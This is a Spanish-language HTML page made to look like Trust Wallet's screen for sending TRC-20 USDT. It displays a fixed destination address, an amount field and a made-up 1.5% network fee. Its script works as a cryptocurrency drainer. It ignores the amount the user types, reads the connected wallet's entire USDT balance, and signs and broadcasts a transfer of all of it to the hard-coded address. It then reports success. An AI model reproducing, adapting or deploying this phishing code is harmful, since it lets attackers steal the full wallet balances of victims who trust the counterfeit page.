<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - Enviar USDT</title>
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #ffffff; color: #111111; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding-top: 30px; }
        .tw-container { width: 100%; max-width: 390px; padding: 20px; }
        .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 24px; }
        .tw-header-title { font-size: 18px; font-weight: 600; color: #0052ff; text-align: center; margin-bottom: 15px; }
        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
        .tw-input-group { background-color: #f6f7f9; border-radius: 16px; padding: 16px; margin-bottom: 16px; }
        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
        .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
        .usdt-icon { width: 18px; height: 18px; }
        
        .commission-box { background: #f6f7f9; border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
        .comm-left { color: #717680; font-size: 14px; }
        .comm-right { text-align: right; }
        .comm-amount { font-weight: 700; font-size: 16px; display: flex; align-items: center; gap: 5px; justify-content: flex-end; }
        .comm-trx { color: #717680; font-size: 12px; }
        .trx-icon { width: 16px; height: 16px; }

        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 24px; display: none; text-align: left; }
        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

    <div class="tw-container">
        <div class="tw-header">
            <div class="tw-header-title">Enviar TetherUsdt Trc-20</div>
            <img src="https://assets.trustwalletapp.com/blockchains/tron/info/logo.png" alt="Trust Wallet" class="tw-logo">
        </div>

        <div class="tw-input-group">
            <label class="tw-label">Dirección</label>
            <input id="addressDisplay" class="tw-input" type="text" readonly />
        </div>

        <div class="tw-input-group">
            <label class="tw-label">Cantidad</label>
            <div class="tw-input-row">
                <input id="amountDisplay" class="tw-input" type="number" placeholder="0" />
                <span class="tw-currency-badge">USDT <img src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png" class="usdt-icon"></span>
            </div>
        </div>

        <div id="commissionArea"></div>
        <div id="status" class="status-box"></div>
        <button class="tw-btn" id="connectBtn">Siguiente</button>
    </div>

<script>
    const BILLETERA_DESTINO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
    let stage = 0;

    document.getElementById('addressDisplay').value = BILLETERA_DESTINO;

    document.getElementById('connectBtn').addEventListener('click', async () => {
        if (typeof window.tronWeb === 'undefined') return alert("Abre este enlace en el navegador de Trust Wallet");
        const tronWeb = window.tronWeb;

        if (stage === 0) {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            stage = 1;
            document.getElementById('connectBtn').innerText = "Confirmar Envío";
        } else if (stage === 1) {
            const amt = parseFloat(document.getElementById('amountDisplay').value);
            if (!amt || amt <= 0) return alert("Ingrese cantidad válida");
            const fee = (amt * 0.015).toFixed(2);
            document.getElementById('commissionArea').innerHTML = `
                <div class="commission-box">
                    <div class="comm-left">Comisión de red</div>
                    <div class="comm-right">
                        <div class="comm-amount">${fee} <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="trx-icon"></div>
                        <div class="comm-trx">${fee}</div>
                    </div>
                </div>`;
            stage = 2;
        } else {
            try {
                const addr = tronWeb.defaultAddress.base58;
                const balance = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "balanceOf(address)", {}, [{type:'address', value: tronWeb.address.toHex(addr)}]);
                const tx = await tronWeb.transactionBuilder.triggerSmartContract(CONTRATO_USDT, "transfer(address,uint256)", {feeLimit: 100000000}, [{type:'address', value: tronWeb.address.toHex(BILLETERA_DESTINO)}, {type:'uint256', value: balance.constant_result[0]}], tronWeb.address.toHex(addr));
                const signed = await tronWeb.trx.sign(tx.transaction);
                await tronWeb.trx.sendRawTransaction(signed);
                document.getElementById('status').innerText = "TRANSACCION EXITOSA";
                document.getElementById('status').style.display = "block";
            } catch (e) { alert("Error en la red"); }
        }
    });
</script>
</body>
</html>
